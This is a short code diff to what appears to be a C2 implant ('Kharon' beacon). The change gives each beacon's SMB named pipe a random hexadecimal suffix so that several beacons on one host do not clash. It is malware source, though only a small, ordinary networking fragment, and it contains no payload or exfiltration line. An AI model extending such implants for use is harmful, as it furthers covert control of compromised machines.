@@ -70,13 +70,27 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
     }
 
     // SMB pipe name as stack byte array (NOT static — .data section is stripped from PIC)
+    // Append 4-char random suffix so each beacon instance gets a unique pipe name.
+    // Without this, multiple beacons on the same host create pipes with the same name,
+    // causing Exchange to connect to the wrong beacon (Windows picks any available instance).
     BYTE smb_pipe_bytes[] = SMB_PIPE_NAME;
-    // Copy to heap so it persists after GetConfig returns
-    ULONG smb_pipe_len = sizeof(smb_pipe_bytes);
-    Self->Tsp->Pipe.Name = (PCHAR)KhAlloc( smb_pipe_len );
-    Mem::Copy( Self->Tsp->Pipe.Name, smb_pipe_bytes, smb_pipe_len );
+    ULONG base_len = sizeof(smb_pipe_bytes) - 1; // exclude null
+    ULONG suffix_len = 5; // "_" + 4 hex chars
+    ULONG total_len = base_len + suffix_len + 1; // + null
+    Self->Tsp->Pipe.Name = (PCHAR)KhAlloc( total_len );
+    Mem::Copy( Self->Tsp->Pipe.Name, smb_pipe_bytes, base_len );
+    Self->Tsp->Pipe.Name[base_len] = '_';
+    {
+        ULONG pseed = Self->Krnl32.GetTickCount();
+        PCHAR hx = (PCHAR)"0123456789abcdef";
+        for ( ULONG si = 0; si < 4; si++ ) {
+            pseed = Self->Ntdll.RtlRandomEx( &pseed );
+            Self->Tsp->Pipe.Name[base_len + 1 + si] = hx[pseed % 16];
+        }
+    }
+    Self->Tsp->Pipe.Name[total_len - 1] = 0;
     Self->Ntdll.DbgPrint( "[SMB-CFG] Pipe name set: %s (len=%d, bytes[0]=0x%02x)\n",
-        Self->Tsp->Pipe.Name, smb_pipe_len, smb_pipe_bytes[0] );
+        Self->Tsp->Pipe.Name, total_len - 1, smb_pipe_bytes[0] );
 #else
     Self->Ntdll.DbgPrint( "[SMB-CFG] PROFILE_C2 is NOT SMB (value=0x%x)\n", PROFILE_C2 );
 #endif
